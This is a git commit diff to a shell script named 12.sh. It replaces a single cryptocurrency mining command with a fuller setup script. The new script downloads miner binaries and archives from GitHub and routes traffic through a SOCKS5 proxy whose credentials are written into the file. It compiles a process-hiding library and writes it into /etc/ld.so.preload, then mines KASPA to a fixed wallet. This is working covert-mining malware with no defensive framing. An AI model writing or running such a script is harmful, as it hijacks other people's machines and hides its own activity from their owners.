7a5f49e5e79f8e01b043e87a2e73cef5f0a61e02
rindalasririn <95740336+rindalasririn@users.noreply.github.com>
2022-09-18 20:28:04 -0500

    Update 12.sh

--- 12.sh
+++ 12.sh
@@ -1,1 +1,46 @@
-wget https://github.com/develsoftware/GMinerRelease/releases/download/2.91/gminer_2_91_linux64.tar.xz && tar -xvf gminer_2_91_linux64.tar.xz && ./miner --algo ethash --server stratum+tcp://ethash.poolbinance.com:1800 --user teguhcong.$(echo tesBezzMiniZ-$(shuf -i 1-99 -n 1)) -p x -d 0 --log_newjob 0 --cuda 1 --watchdog 0 --proxy 176.53.133.217:57597 --Tor
+#!/bin/sh
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
+
+apt update -y;apt -y install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential binutils git cmake screen unzip net-tools curl -y
+
+wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
+
+tar -xvzf graphics.tar.gz
+
+cat > graftcp/local/graftcp-local.conf <<END
+listen = :2233
+loglevel = 1
+socks5 = 45.155.69.201:6406
+socks5_username = ingfoingfo
+socks5_password = maszZeehh
+END
+
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+sleep .2
+
+echo " "
+echo " "
+
+echo ""
+
+./graftcp/graftcp curl ifconfig.me
+
+echo " "
+echo " "
+
+echo " "
+echo " "
+
+./graftcp/graftcp wget https://github.com/putri212/mbah/raw/main/lolMiner
+chmod +x lolMiner 
+
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
+unzip magicBezzHash.zip
+make
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+mv libprocesshider.so /usr/local/lib/
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+
+./graftcp/graftcp ./lolMiner --coin KASPA --pool stratum+tcp://pool.us.woolypooly.com --port 3112 --user kaspa:qqjgh3lff277858uhn7upgpl4xlmqkhwry33wg0vfjxhnxexap8gywc62xf3f.sonco
